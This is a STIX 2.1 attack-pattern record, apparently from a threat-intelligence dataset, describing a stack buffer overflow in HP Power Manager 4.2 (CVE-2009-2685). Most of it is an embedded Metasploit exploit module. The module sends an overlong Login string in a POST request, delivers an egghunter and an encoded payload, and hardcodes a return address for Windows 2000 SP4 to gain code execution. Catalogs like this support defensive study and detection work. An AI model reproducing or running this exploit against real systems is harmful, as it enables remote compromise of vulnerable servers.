{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--70bd11c8-2dc8-4dd0-9804-36ed0c98876a",
    "created": "2024-08-14T16:54:57.614532Z",
    "modified": "2024-08-14T16:54:57.614536Z",
    "name": "Hewlett-Packard Power Manager Administration Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Hewlett-Packard Power Manager 4.2. Sending a specially crafted POST request with an overly long Login string, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_power_manager_login.rb",
            "external_id": "hp_power_manager_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2685"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Hewlett-Packard Power Manager Administration Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Hewlett-Packard Power Manager 4.2.\n        Sending a specially crafted POST request with an overly long Login string, an\n        attacker may be able to execute arbitrary code.\n      },\n      'Author'         => [ 'MC', 'sinn3r' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-2685' ],\n          [ 'OSVDB', '59684'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          #'Space'    => 600,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c&=+?:;-,/#.\\\\$%\\x1a\",\n          'EncoderType' => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' => { 'BufferRegister'=>'EDI' },\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 SP4 English', { 'Ret' => 0x75022ac4 } ], # pop/pop/ret in msvcp60.dll\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-11-04'))\n  end\n\n  def exploit\n\n    opts = { :checksum => true }\n    hunter,p = generate_egghunter(payload.encoded, payload_badchars, opts)\n\n    sploit = rand_text_alpha_upper(2024)\n\n    # Around 600 bytes of room for egghunter\n    sploit[633,2] = Rex::Arch::X86.jmp_short(24)\n    sploit[635,4] = [target.ret].pack('V')\n    sploit[639,32] = make_nops(32)\n    sploit[671,hunter.length] = hunter\n\n    print_status(\"Trying target #{target.name}...\")\n\n    req = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => '/goform/formLogin',\n      'vars_post' => {\n        'HtmlOnly'    => 'true',\n        'Login'       => sploit + 'passwd',\n        'Password'    => '',\n        'loginButton' => 'Submit+Login'\n      },\n      'headers' => {\n        'Accept' => p\n      }\n    }, 10)\n\n    select(nil,nil,nil,5)\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-11-04",
    "x_mitre_platforms": [
        "win'"
    ]
}